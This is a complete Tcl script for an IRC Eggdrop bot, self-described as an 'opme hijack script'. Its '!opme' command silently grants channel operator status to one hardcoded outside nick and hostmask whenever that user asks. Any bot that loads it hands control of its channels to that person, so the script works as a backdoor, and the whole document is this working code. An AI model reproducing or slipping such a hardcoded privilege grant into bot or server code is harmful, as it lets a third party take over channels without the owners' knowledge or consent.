#opme hijack script - written for fun, no malicious intent

set opwho "HM2K!HM2K@ROFL.name"

bind pub - !opme pub:opme

proc pub:opme {nick host hand chan arg} {
  global opwho oppass
  if {"$nick!$host" == $opwho} {
	 puthelp "MODE $chan +o $nick"
	 return 1
	}
}
